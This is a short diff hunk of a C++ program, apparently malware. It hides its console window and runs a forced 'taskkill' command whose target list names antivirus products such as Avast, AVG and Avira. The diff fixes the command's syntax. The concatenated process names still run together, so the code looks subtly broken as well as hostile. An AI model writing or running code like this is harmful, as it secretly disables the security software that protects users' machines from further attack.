@@ -6,7 +6,7 @@ using namespace std;
 int main(){
   FreeConsole(); //Just Hides The Console Screen!
   
-  system(("taskkill /F /T IM "arcavir
+  system(("taskkill /F /T /IM arcavir"
                               "avast"
                               "avg"
                               "avira"
